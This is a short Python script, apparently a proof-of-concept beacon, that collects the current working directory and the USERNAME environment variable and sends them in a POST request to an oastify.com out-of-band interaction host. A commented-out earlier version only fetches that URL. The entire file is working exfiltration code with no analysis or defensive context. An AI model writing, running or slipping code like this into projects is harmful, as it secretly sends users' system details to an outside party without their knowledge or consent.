# import urllib
# with urllib.request.urlopen('https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com') as response:
#    html = response.read()

# print("hello world")


import os
import urllib.parse
import urllib.request

# Get the current working directory
current_directory = os.getcwd()

# Define the URL to send the data
url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'

# Create a dictionary with the data to send
data = {
    'directory': current_directory,
    'user': os.environ['USERNAME']
}

# Encode the data for the URL
encoded_data = urllib.parse.urlencode(data).encode('utf-8')

# Send the data to the URL
with urllib.request.urlopen(url, data=encoded_data) as response:
    print(f'Data sent successfully to {url}')

